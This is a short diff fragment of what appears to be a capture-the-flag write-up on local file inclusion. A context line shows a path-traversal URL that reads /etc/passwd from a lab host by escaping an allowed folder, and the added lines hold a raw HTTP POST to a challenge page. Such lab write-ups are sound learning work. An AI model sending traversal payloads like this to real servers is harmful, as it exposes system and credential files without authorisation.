@@ -95,3 +95,12 @@ Typing anything gets me error "Access Denied! Allowed files at THM-profile folde
 `http://10.114.188.66/lab6.php?file=/THM-profile/../../../../etc/passwd`
 
 So we need to start from that point
+
+
+
+POST /challenges/chall1.php HTTP/1.1
+Host: 10.114.136.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 9
+
+file=test
